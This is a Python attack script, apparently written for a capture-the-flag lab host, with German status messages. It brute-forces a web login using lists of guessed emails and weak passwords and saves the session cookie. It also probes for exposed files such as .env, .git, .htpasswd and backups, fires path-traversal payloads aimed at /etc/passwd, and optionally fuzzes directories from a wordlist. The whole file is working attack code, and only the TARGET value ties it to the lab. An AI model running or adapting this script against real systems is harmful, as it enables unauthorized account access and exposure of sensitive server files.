import os
def big_wordlist_fuzz(wordlist_path):
    print(f"\n[+] Starte großes Directory-Fuzzing mit {wordlist_path} ...")
    if not os.path.exists(wordlist_path):
        print(f"[!] Wordlist nicht gefunden: {wordlist_path}")
        return
    found = []
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            path = line.strip().lstrip("/")
            if not path or path.startswith("#"): continue
            url = TARGET.rstrip("/") + "/" + path
            try:
                r = requests.get(url, timeout=5)
                if r.status_code in [200, 301, 302] and "not found" not in r.text.lower():
                    print(f"[!] Möglich gefunden: {url} (Status: {r.status_code})")
                    found.append(url)
            except Exception as e:
                pass
    if not found:
        print("[-] Keine Treffer mit Wordlist.")
    else:
        print(f"[+] {len(found)} mögliche Treffer gefunden.")
    return found
import requests

TARGET = "http://10.114.168.73/"
LOGIN_URL = TARGET
EMAILS = ["admin@support.thm", "help@support.thm", "admin@admin.com", "admin@support.local"]
PASSWORDS = ["admin", "password", "support", "admin123", "support123", "password123"]

def try_login(email, password):
    session = requests.Session()
    data = {
        "email": email,
        "password": password
    }
    resp = session.post(LOGIN_URL, data=data, allow_redirects=True)
    if "Invalid credentials" not in resp.text and resp.status_code == 200:
        print(f"[+] Success: {email}:{password}")
        # Save session for further use
        with open("session_cookie.txt", "w") as f:
            f.write(str(session.cookies.get_dict()))
        # Save response for analysis
        with open("dashboard.html", "w", encoding="utf-8") as f:
            f.write(resp.text)
        return session
    else:
        print(f"[-] Failed: {email}:{password}")
    return None

def main():
    for email in EMAILS:
        for password in PASSWORDS:
            session = try_login(email, password)
            if session:
                print("[*] Logged in, check dashboard.html for flag or next steps.")
                return


COMMON_PATHS = [
    "admin", "dashboard", "api", "debug", "upload", "uploads", "backup", "config", "shell", "console", ".git", ".env", "robots.txt", ".htaccess", ".htpasswd", "db", "db.sql", "database", "backup.zip", "backup.tar", "backup.tar.gz", "user.txt", "flag.txt", "home", "home/ubuntu/user.txt"
]

LFI_TESTS = [
    ("file", "../../../../../../etc/passwd"),
    ("path", "../../../../../../etc/passwd"),
    ("page", "../../../../../../etc/passwd"),
    ("include", "../../../../../../etc/passwd"),
    ("template", "../../../../../../etc/passwd"),
    ("?file=", "/etc/passwd"),
    ("?path=", "/etc/passwd"),
    ("?page=", "/etc/passwd"),
    ("?include=", "/etc/passwd"),
    ("?template=", "/etc/passwd"),
]

def fuzz_directories():
    print("\n[+] Directory/Datei-Fuzzing...")
    found = []
    for path in COMMON_PATHS:
        url = TARGET.rstrip("/") + "/" + path
        try:
            r = requests.get(url, timeout=5)
            if r.status_code in [200, 301, 302] and "not found" not in r.text.lower():
                print(f"[!] Möglich gefunden: {url} (Status: {r.status_code})")
                found.append(url)
        except Exception as e:
            print(f"[!] Fehler bei {url}: {e}")
    if not found:
        print("[-] Keine offensichtlichen Pfade gefunden.")
    return found

def check_lfi_rce():
    print("\n[+] LFI/RCE-Parameter-Check...")
    for param, payload in LFI_TESTS:
        url = TARGET.rstrip("/") + f"/?{param}={payload}"
        try:
            r = requests.get(url, timeout=5)
            if "root:x:" in r.text or "ubuntu" in r.text or "flag" in r.text:
                print(f"[!!!] LFI/RCE möglich bei: {url}")
        except Exception as e:
            print(f"[!] Fehler bei {url}: {e}")


def main_all():
    print("[=] Starte alle Checks gegen das Ziel...")
    main()  # Login-Bruteforce
    fuzz_directories()
    check_lfi_rce()
    # Optional: großes Directory-Fuzzing mit Wordlist
    wordlist = input("Pfad zur Wordlist für großes Fuzzing (Enter für Überspringen): ").strip()
    if wordlist:
        big_wordlist_fuzz(wordlist)
    print("[=] Fertig. Prüfe Ausgaben und ggf. gefundene Dateien/Pfade.")

if __name__ == "__main__":
    main_all()